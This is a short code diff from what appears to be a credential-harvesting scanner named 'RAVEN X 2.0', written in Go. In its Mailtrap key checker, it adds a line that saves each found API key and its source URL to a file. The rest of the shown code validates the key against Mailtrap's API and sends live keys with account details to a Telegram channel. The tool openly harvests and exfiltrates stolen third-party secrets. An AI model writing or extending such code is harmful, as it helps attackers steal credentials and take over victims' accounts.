@@ -23,6 +23,8 @@ func (a *AWSScanner) CheckMailtrap(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailtrap_found.txt")
+
 	req, err := http.NewRequest("GET", "https://mailtrap.io/api/accounts", nil)
 	if err != nil {
 		return false
@@ -61,14 +63,8 @@ func (a *AWSScanner) CheckMailtrap(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📬 <b>MAILTRAP LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🏢 <b>Account:</b> %s
-🔗 <b>Source:</b> %s
-`, key, info, sourceURL)
+	msg := a.tgHit("📬", "MAILTRAP", sourceURL) + fmt.Sprintf(
+		"\n🔑 <b>Key:</b> <code>%s</code>\n🏢 <b>Account:</b> %s\n", key, info)
 	go a.sendTelegram(msg)
 	return true
 }
